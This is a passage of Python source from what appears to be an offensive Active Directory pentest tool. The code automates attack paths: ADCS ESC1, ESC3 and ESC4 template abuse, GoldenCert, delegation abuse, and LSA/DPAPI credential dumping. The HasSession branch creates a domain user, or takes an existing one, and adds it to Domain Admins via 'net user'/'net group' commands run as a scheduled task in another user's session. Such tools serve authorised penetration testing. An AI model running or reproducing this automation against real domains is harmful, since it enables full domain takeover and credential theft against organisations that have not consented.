                    print_warning("Cannot execute ADCSESC1: missing from/to details.")
                    print_info_debug(
                        f"[adcsesc1] Missing labels: from_label={from_label!r}, to_label={to_label!r}"
                    )
                    return execution_started

                # BloodHound models ESC1 as a direct edge to the Domain node. The actual
                # exploit requires a vulnerable certificate template, so we enumerate
                # templates via Certipy for the selected credential and pick one.
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC1: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    print_info_debug(
                        f"[adcsesc1] No exec username: context_username={context_username!r}, "
                        f"applies_to_users={summary.get('applies_to_users')!r}"
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC1: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    print_info_debug(
                        f"[adcsesc1] Missing credential: context_password={'set' if context_password else 'unset'}, "
                        f"resolved_password={'set' if _resolve_domain_password(shell, domain, exec_username) else 'unset'}"
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC1 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    print_info_debug(
                        f"[adcsesc1] Domain data missing pdc: keys={list(domain_data.keys())!r}"
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC1 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    print_info_debug(
                        f"[adcsesc1] Missing ADCS metadata: adcs={domain_data.get('adcs')!r}, "
                        f"ca={domain_data.get('ca')!r}"
                    )
                    return execution_started

                esc1_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="1",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                if not esc1_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="1")
                    if manual_template:
                        esc1_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc1] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC1 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc1_templates:
                    print_warning(
                        "No ESC1 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="1",
                    templates=esc1_templates,
                )
                if not template:
                    print_warning("ESC1 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC1",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "template": template},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC1",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "template": template},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_esc1"):
                        shell.adcs_esc1(  # type: ignore[attr-defined]
                            domain, exec_username, password, template
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import adcs_esc1

                        adcs_esc1(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=template,
                        )
                continue

            if key == "adcsesc3":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC3: missing from/to details.")
                    return execution_started

                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC3: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC3: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC3 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC3 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                esc3_agent_templates = _extract_cert_templates_by_role(
                    details,
                    role="agent",
                )
                if esc3_agent_templates:
                    marked = ", ".join(
                        mark_sensitive(template_name, "service")
                        for template_name in esc3_agent_templates
                    )
                    print_info_debug(
                        "[adcsesc3] Using agent template(s) from attack step details: "
                        f"{marked}"
                    )
                else:
                    esc3_agent_templates = _resolve_adcs_template_candidates(
                        shell,
                        domain=domain,
                        exec_username=exec_username,
                        password=password,
                        esc_number="3",
                        details=details,
                        to_label=to_label,
                        domain_data=domain_data,
                    )
                if not esc3_agent_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="3")
                    if manual_template:
                        esc3_agent_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc3] Using operator-specified agent template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC3 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc3_agent_templates:
                    print_warning(
                        "No ESC3 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                agent_template = _select_adcs_template(
                    shell,
                    esc_number="3",
                    templates=esc3_agent_templates,
                    prompt_label="agent template",
                )
                if not agent_template:
                    print_warning("ESC3 execution cancelled.")
                    return execution_started

                esc3_target_templates = _extract_cert_templates_by_role(
                    details,
                    role="target",
                )
                if not esc3_target_templates:
                    esc3_target_templates = ["User"]
                default_target_idx = 0
                for idx, template_name in enumerate(esc3_target_templates):
                    if str(template_name).strip().lower() == "user":
                        default_target_idx = idx
                        break

                client_auth_template = _select_adcs_template(
                    shell,
                    esc_number="3",
                    templates=esc3_target_templates,
                    default_idx=default_target_idx,
                    prompt_label="target template",
                )
                if not client_auth_template:
                    print_warning("ESC3 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC3",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template": agent_template,
                        "client_auth_template": client_auth_template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC3",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template": agent_template,
                                "client_auth_template": client_auth_template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_esc3"):
                        shell.adcs_esc3(  # type: ignore[attr-defined]
                            domain,
                            exec_username,
                            password,
                            agent_template,
                            client_auth_template=client_auth_template,
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import adcs_esc3

                        adcs_esc3(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=agent_template,
                            client_auth_template=client_auth_template,
                        )
                continue

            if key == "adcsesc4":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC4: missing from/to details.")
                    return execution_started

                # Prefer using the credential for the step source (the user that has
                # the ESC4 relationship), then fall back to the context user and
                # finally to an applies_to user (owned/group paths).
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC4: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC4: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC4 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC4 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                # ESC4 is disruptive: it modifies a certificate template in AD.
                # Require explicit operator confirmation.
                message = Text()
                marked_user = mark_sensitive(exec_username, "user")
                message.append(
                    "ESC4 will modify an ADCS certificate template in Active Directory.\n",
                    style="bold yellow",
                )
                message.append(
                    f"Execution user: {marked_user}\n\n",
                    style="bold",
                )
                message.append(
                    "What ADscan will do:\n",
                    style="bold",
                )
                message.append(
                    " - Backup current template configuration\n"
                    " - Modify the template to enable ESC1-style abuse\n"
                    " - Request an auth certificate and attempt Pass-the-Certificate\n"
                    " - Restore the original template configuration (best-effort)\n\n",
                    style="dim",
                )
                message.append(
                    "Risk notes:\n",
                    style="bold",
                )
                message.append(
                    " - If restore fails, the template may remain modified until manually restored.\n",
                    style="dim",
                )
                print_panel(
                    message,
                    title=Text("Disruptive Operation: ADCS ESC4", style="bold yellow"),
                    border_style="yellow",
                    expand=False,
                )
                if not Confirm.ask(
                    "Proceed with ESC4 template modification?",
                    default=True,
                ):
                    print_warning("ESC4 execution cancelled by operator.")
                    return execution_started

                esc4_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="4",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                    allow_object_control=True,
                )

                if not esc4_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="4")
                    if manual_template:
                        esc4_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc4] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        marked_user = mark_sensitive(exec_username, "user")
                        print_warning(
                            f"No ESC4 vulnerable certificate templates found for {marked_user}."
                        )
                        return execution_started
                if not esc4_templates:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"No ESC4 vulnerable certificate templates found for {marked_user}."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="4",
                    templates=esc4_templates,
                )
                if not template:
                    print_warning("ESC4 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC4",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "template": template},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC4",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "template": template},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_esc4"):
                        shell.adcs_esc4(  # type: ignore[attr-defined]
                            domain, exec_username, password, template
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import adcs_esc4

                        adcs_esc4(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=template,
                        )
                continue

            if key == "goldencert":
                if not from_label or not to_label:
                    print_warning("Cannot execute GoldenCert: missing from/to details.")
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute GoldenCert for {marked_domain}: missing PDC/CA info."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started

                exec_username = _resolve_golden_cert_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        "Cannot execute GoldenCert: no stored credential found for "
                        f"{marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                ca_target_host = _resolve_golden_cert_target_host(
                    shell,
                    domain=domain,
                    from_label=from_label,
                    domain_data=domain_data,
                )
                if not ca_target_host:
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute GoldenCert for {marked_domain}: CA host is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="CA host is not resolvable",
                    )
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="GoldenCert",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "ca_host": ca_target_host,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="GoldenCert",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "ca_host": ca_target_host,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_golden_cert"):
                        shell.adcs_golden_cert(  # type: ignore[attr-defined]
                            domain,
                            exec_username,
                            password,
                            ca_target_host,
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import (
                            adcs_golden_cert,
                        )

                        adcs_golden_cert(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            ca_target_host=ca_target_host,
                        )
                continue

            if key == "hassession":
                if not from_label or not to_label:
                    print_warning("Cannot execute HasSession: missing from/to details.")
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing from/to details",
                    )
                    return execution_started

                target_host, session_user = _resolve_hassession_host_and_user(
                    shell,
                    domain=domain,
                    from_label=from_label,
                    to_label=to_label,
                )
                if not target_host:
                    print_warning(
                        "Cannot execute HasSession: session host is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Session host is not resolvable",
                    )
                    return execution_started
                if not session_user or not _is_valid_domain_username(
                    session_user, allow_machine=True
                ):
                    print_warning(
                        "Cannot execute HasSession: session user is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Session user is not resolvable",
                    )
                    return execution_started

                if (
                    ensure_host_bound_workflow_target_viable(
                        shell,
                        domain=domain,
                        target_host=target_host,
                        workflow_label="HasSession exploitation",
                        resume_after_pivot=True,
                    )
                    is None
                ):
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="blocked",
                        reason="Session host is not reachable from the current vantage",
                    )
                    return execution_started

                exec_username, password, exec_context_source = (
                    _resolve_hassession_execution_user(
                        shell,
                        domain=domain,
                        summary=summary,
                        steps=steps,
                        current_step_index=idx - 1,
                        target_host=target_host,
                        from_label=from_label,
                        context_username=context_username,
                        context_password=context_password,
                    )
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        "Cannot execute HasSession: no stored credential found for "
                        f"{marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started
                if exec_context_source == "generic_context":
                    print_info_debug(
                        "[hassession] No prior host-access credential context "
                        "for this host; using generic execution credential context."
                    )

                non_interactive = is_non_interactive(shell)
                create_new_user = True
                if not non_interactive and hasattr(shell, "_questionary_select"):
                    options = [
                        "Create new domain user, then add to Domain Admins (Recommended)",
                        "Add existing domain user to Domain Admins",
                        "Cancel",
                    ]
                    choice = shell._questionary_select(
                        "HasSession exploitation mode:",
                        options,
                        default_idx=0,
                    )
                    if choice is None or choice >= len(options) - 1:
                        return execution_started
                    create_new_user = choice == 0
                elif not non_interactive:
                    create_new_user = Confirm.ask(
                        "Create a new domain user and add it to Domain Admins?",
                        default=True,
                    )

                target_user = ""
                target_password: str | None = None
                if create_new_user:
                    default_user = _generate_default_hassession_username()
                    if non_interactive:
                        selected_user = default_user
                    else:
                        selected_user = Prompt.ask(
                            "New domain username to create",
                            default=default_user,
                        ).strip()
                    selected_user = _normalize_account(selected_user)
                    if not _is_valid_domain_username(selected_user):
                        print_warning(
                            "Cannot execute HasSession: invalid new username. "
                            "Use 1-20 chars with letters, digits, dot, underscore or hyphen."
                        )
                        return execution_started

                    generated_password = _generate_strong_password(12)
                    if non_interactive:
                        selected_password = generated_password
                    else:
                        selected_password = Prompt.ask(
                            "Password for the new domain user",
                            default=generated_password,
                        ).strip()
                    if not _is_password_complex(selected_password):
                        print_warning(
                            "Cannot execute HasSession: password must be at least "
                            "12 chars and include lower/upper/digit/symbol."
                        )
                        return execution_started
                    target_user = selected_user
                    target_password = selected_password
                else:
                    stored_creds = (
                        getattr(shell, "domains_data", {})
                        .get(domain, {})
                        .get("credentials", {})
                    )
                    credential_users = (
                        sorted(
                            {
                                str(user).strip()
                                for user in stored_creds.keys()
                                if isinstance(user, str)
                                and _is_valid_domain_username(
                                    _normalize_account(user)
                                )
                            },
                            key=str.lower,
                        )
                        if isinstance(stored_creds, dict)
                        else []
                    )
                    if non_interactive:
                        selected_user = exec_username
                    elif hasattr(shell, "_questionary_select") and credential_users:
                        options = credential_users + ["Enter username", "Cancel"]
                        selected_idx = shell._questionary_select(
                            "Select the user to elevate to Domain Admins:",
                            options,
                            default_idx=0,
                        )
                        if selected_idx is None or selected_idx >= len(options) - 1:
                            return execution_started
                        if selected_idx == len(options) - 2:
                            selected_user = Prompt.ask(
                                "Existing username to add to Domain Admins",
                                default=exec_username,
                            ).strip()
                        else:
                            selected_user = options[selected_idx]
                    else:
                        selected_user = Prompt.ask(
                            "Existing username to add to Domain Admins",
                            default=exec_username,
                        ).strip()
                    target_user = _normalize_account(selected_user)
                    if not _is_valid_domain_username(target_user):
                        print_warning(
                            "Cannot execute HasSession: invalid target username."
                        )
                        return execution_started

                group_candidates = _resolve_domain_admin_group_candidates(shell, domain)
                if not group_candidates:
                    group_candidates = ["Domain Admins", "Admins. del dominio"]

                marked_host = mark_sensitive(target_host, "hostname")
                marked_session_user = mark_sensitive(session_user, "user")
                marked_exec_user = mark_sensitive(exec_username, "user")
                marked_target_user = mark_sensitive(target_user, "user")
                mode_label = "create+addmember" if create_new_user else "addmember"
                print_panel(
                    "\n".join(
                        [
                            f"Domain: {mark_sensitive(domain, 'domain')}",
                            f"Target host: {marked_host}",
                            f"Session user: {marked_session_user}",
                            f"Executor: {marked_exec_user}",
                            f"Mode: {mode_label}",
                            f"Target user: {marked_target_user}",
                        ]
                    ),
                    title=Text(
                        "HasSession Exploitation Plan",
                        style=f"bold {BRAND_COLORS['info']}",
                    ),
                    border_style=BRAND_COLORS["info"],
                    expand=False,
                )

                if not non_interactive and not Confirm.ask(
                    "Execute HasSession exploitation now?",
                    default=True,
                ):
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "target_host": target_host,
                        "session_user": session_user,
                        "target_user": target_user,
                        "mode": mode_label,
                        "exec_context_source": exec_context_source,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "target_host": target_host,
                                "session_user": session_user,
                                "target_user": target_user,
                                "mode": mode_label,
                                "exec_context_source": exec_context_source,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    command_failed = False
                    if create_new_user and target_password is not None:
                        create_command = (
                            f'net user "{target_user}" "{target_password}" /add /domain'
                        )
                        create_ok, create_output = _run_hassession_schtask_command(
                            shell,
                            domain=domain,
                            exec_username=exec_username,
                            exec_password=password,
                            target_host=target_host,
                            session_user=session_user,
                            command_to_run=create_command,
                            log_suffix="create_user",
                        )
                        if not create_ok:
                            lowered = create_output.lower()
                            already_exists = any(
                                marker in lowered
                                for marker in (
                                    "account already exists",
                                    "ya existe",
                                    "el usuario ya existe",
                                    "2224",
                                )
                            )
                            if already_exists:
                                print_warning(
                                    "Target user already exists. Continuing with group escalation."
                                )
                            else:
                                print_warning(
                                    "HasSession user-creation command did not complete successfully."
                                )
                                command_failed = True

                    verified_da = False
                    selected_group: str | None = None
                    waited_for_membership = False
                    if not command_failed:
                        for group_name in group_candidates:
                            add_command = (
                                f'net group "{group_name}" "{target_user}" /add /domain'
                            )
                            add_ok, _ = _run_hassession_schtask_command(
                                shell,
                                domain=domain,
                                exec_username=exec_username,
                                exec_password=password,
                                target_host=target_host,
                                session_user=session_user,
                                command_to_run=add_command,
                                log_suffix=f"addmember_{group_name}",
                            )
                            if not add_ok:
                                continue
                            if not waited_for_membership:
                                _wait_for_hassession_membership_propagation(
                                    shell,
                                    domain=domain,
                                    target_user=target_user,
                                )
                                waited_for_membership = True
                            membership = _is_user_domain_admin_via_sid(
                                shell,
                                domain=domain,
                                target_user=target_user,
                                auth_username=exec_username,
                                auth_password=password,
                            )
                            if membership is True:
                                verified_da = True
                                selected_group = group_name
                                break

                    if not verified_da and not command_failed:
                        if not waited_for_membership:
                            _wait_for_hassession_membership_propagation(
                                shell,
                                domain=domain,
                                target_user=target_user,
                            )
                        membership = _is_user_domain_admin_via_sid(
                            shell,
                            domain=domain,
                            target_user=target_user,
                            auth_username=exec_username,
                            auth_password=password,
                        )
                        verified_da = membership is True

                    if verified_da:
                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status="success",
                                notes={
                                    "username": exec_username,
                                    "target_host": target_host,
                                    "session_user": session_user,
                                    "target_user": target_user,
                                    "mode": mode_label,
                                    "group": selected_group or "RID-512",
                                    "exec_context_source": exec_context_source,
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)

                        print_info(
                            "HasSession escalation confirmed: "
                            f"{mark_sensitive(target_user, 'user')} is now in "
                            "Domain Admins (RID 512)."
                        )
                        if hasattr(shell, "add_credential"):
                            credential_to_register = target_password or (
                                _get_stored_domain_credential_for_user(
                                    shell, domain=domain, username=target_user
                                )
                            )
                            if credential_to_register:
                                add_credential_fn = getattr(shell, "add_credential", None)
                                if callable(add_credential_fn):
                                    add_credential_fn(
                                        domain,
                                        target_user,
                                        credential_to_register,
                                    )
                            else:
                                print_info_debug(
                                    "[hassession] Escalation verified but no stored credential "
                                    f"available for {mark_sensitive(target_user, 'user')}; "
                                    "skipping add_credential post-flow trigger."
                                )
                    else:
                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status="failed",
                                notes={
                                    "username": exec_username,
                                    "target_host": target_host,
                                    "session_user": session_user,
                                    "target_user": target_user,
                                    "mode": mode_label,
                                    "exec_context_source": exec_context_source,
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)
                        print_warning(
                            "HasSession exploitation executed, but Domain Admin "
                            "membership could not be verified."
                        )
                continue

            if key == "allowedtodelegate":
                if not from_label or not to_label:
                    print_warning(
                        "Cannot execute AllowedToDelegate: missing from/to details."
                    )
                    return execution_started

                # Prefer running with the provided context credential. Otherwise try to use the
                # credential for the source node when available.
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                if not hasattr(shell, "enum_delegations_user"):
                    print_warning(
                        "Cannot execute this step: delegation executor is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Delegation executor unavailable",
                    )
                    return execution_started

                execution_started = True

                with _active_step_context(
                    action="AllowedToDelegate",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="AllowedToDelegate",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    shell.enum_delegations_user(domain, exec_username, password)
                continue

            if key in {"dumplsa", "dumpdpapi"}:
                if not from_label:
                    print_warning(
                        f"Cannot execute {action}: missing source host details."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing source host details",
                    )
                    return execution_started

                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                source_host = (
                    resolve_netexec_target_for_node_label(
                        shell, domain, node_label=from_label
                    )
                    or ""
                )
                if not source_host:
                    print_warning(
                        f"Cannot execute {action}: source node is not a resolvable host."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Source node is not a resolvable host",
                    )
                    return execution_started

                if key == "dumplsa":
                    dump_handler = getattr(shell, "dump_lsa", None)
                else:
                    dump_handler = getattr(shell, "dump_dpapi", None)
                if not callable(dump_handler):
                    print_warning(
                        f"Cannot execute {action}: dump executor is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Dump executor unavailable",
                    )
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "target_host": source_host},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "target_host": source_host,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    dump_handler(
                        domain,
                        exec_username,
                        password,
                        source_host,
                        "false",
                    )

                target_user = _normalize_account(to_label)
                if target_user and not _resolve_domain_password(
                    shell, domain, target_user
                ):
                    marked_user = mark_sensitive(target_user, "user")
                    print_warning(
                        f"{action} did not recover a credential for {marked_user}. Stopping this path."
                    )
                    return True
                continue

            # Unknown supported key shouldn't happen due to pre-check, but keep safe.
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="step_blocked",
                message=f"Cannot execute this step yet: {action}",
                step_index=idx,
                total_steps=total_executable_steps,
                executable_step_index=executable_step_position,
                last_executable_idx=last_executable_idx,
                action=action,
                from_label=from_label,
                to_label=to_label,
                step_status="blocked",
                reason="unknown_supported_step",
            )
            print_warning(f"Cannot execute this step yet: {action}")
            return execution_started

        if execution_started:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_completed",
                message="Attack path execution finished.",
                total_steps=total_executable_steps,
